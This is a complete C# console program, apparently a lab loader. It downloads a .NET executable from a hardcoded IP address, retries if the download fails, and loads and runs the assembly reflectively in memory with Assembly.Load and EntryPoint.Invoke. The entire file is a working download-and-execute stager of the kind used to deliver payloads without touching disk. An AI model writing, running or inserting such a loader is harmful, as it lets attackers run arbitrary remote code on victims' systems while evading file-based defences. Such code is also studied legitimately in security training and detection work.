using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Frieza
{
    class Program
    {
        static void ReflectFromWeb(string url, int retrycount, int timeoutTimer)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            byte[] programBytes = null;
            while (retrycount >= 0 && programBytes == null)
            {
                try
                {
                    programBytes = client.DownloadData(url);
                }
                catch (WebException ex)
                {
                    Console.WriteLine("Assembly not found yet. sleeping for {0} seconds and retrying another {1} time(s)...", timeoutTimer, retrycount);
                    retrycount--;
                    Thread.Sleep(timeoutTimer * 1000);
                }
            }
            if (programBytes == null)
            {
                Console.WriteLine("Assembly was not found, exitting now...");
                Environment.Exit(-1);
            }
            Assembly dotnetProgram = Assembly.Load(programBytes);
            object[] parameters = new String[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters);
        }
        static void Main(string[] args)
        {
            ReflectFromWeb("http://192.168.64.138/HelloFromReflectionWorld.exe", 3, 5);
        }
    }
}
